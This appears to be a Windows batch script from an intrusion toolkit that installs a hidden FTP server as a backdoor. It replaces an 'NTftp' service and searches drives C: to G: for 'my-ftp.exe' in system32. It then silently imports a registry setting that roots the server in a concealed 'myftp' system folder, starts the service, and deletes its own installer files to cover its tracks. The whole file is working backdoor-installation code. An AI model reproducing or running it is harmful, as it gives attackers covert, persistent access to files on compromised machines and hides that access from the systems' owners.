if not exist NTftp.exe goto A
net stop ntftp
NTftp.exe -uninstall
attrib -r NTftp.bak
del NTftp.bak
goto cc

:A
ren NTftp.bak NTftp.exe

:cc
if exist C:\winnt\system32\my-ftp.exe goto ccc
goto dd

:ccc
echo "LocalRoot"="C:\\winnt\\system32\\myftp">>ftp.reg
goto reg

:dd
if exist D:\winnt\system32\my-ftp.exe goto ddd
goto ee

:ddd
echo "LocalRoot"="D:\\winnt\\system32\\myftp">>ftp.reg
goto reg

:ee
if exist E:\winnt\system32\my-ftp.exe goto eee
goto ff

:eee
echo "LocalRoot"="E:\\winnt\\system32\\myftp">>ftp.reg
goto reg

:ff
if exist F:\winnt\system32\my-ftp.exe goto fff
goto gg

:fff
echo "LocalRoot"="F:\\winnt\\system32\\myftp">>ftp.reg
goto reg

:gg
if exist G:\winnt\system32\my-ftp.exe goto ggg
goto ccc

:ggg
echo "LocalRoot"="G:\\winnt\\system32\\myftp">>ftp.reg

:reg
regedit /s ftp.reg
NTftp.exe -install
net start NTftp
attrib -r ftp.reg
attrib -r ftp.exe
attrib -r run.bat
del ftp.reg
del hftp.exe
del run.bat